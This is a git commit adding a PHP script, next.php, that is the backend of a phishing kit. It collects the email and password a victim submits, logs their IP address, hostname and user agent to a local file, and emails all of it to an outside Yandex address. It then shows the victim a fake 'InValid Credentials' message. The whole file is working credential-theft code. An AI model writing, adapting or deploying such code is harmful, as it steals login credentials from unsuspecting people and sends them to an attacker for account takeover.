ff8de47ff10357b91d2d21399149d8e6c17c8be7
Trugfit <119011179+trugfit010@users.noreply.github.com>
2024-12-30 03:35:18 -0600

    Add files via upload

---
+++ next.php
@@ -0,0 +1,38 @@
+<?php
+
+$email = trim($_POST['ai']);
+$password = trim($_POST['pr']);
+
+if($email != null && $password != null){
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| Email Result |--------------|\n";
+	$message .= "Email            : ".$email."\n";
+	$message .= "Pass             : ".$password."\n";
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- CrEaTeD --------------|\n";
+	$send = "officespace010@yandex.com";
+	$subject = "Email Result : $ip";$file = fopen("../stored.txt","a+"); 
+fwrite($file,$message); 
+    mail($send, $subject, $message);   
+	$signal = 'ok';
+	$msg = 'InValid Credentials';
+	
+	// $praga=rand();
+	// $praga=md5($praga);
+}
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg
+    );
+    echo json_encode($data);
+
+?>
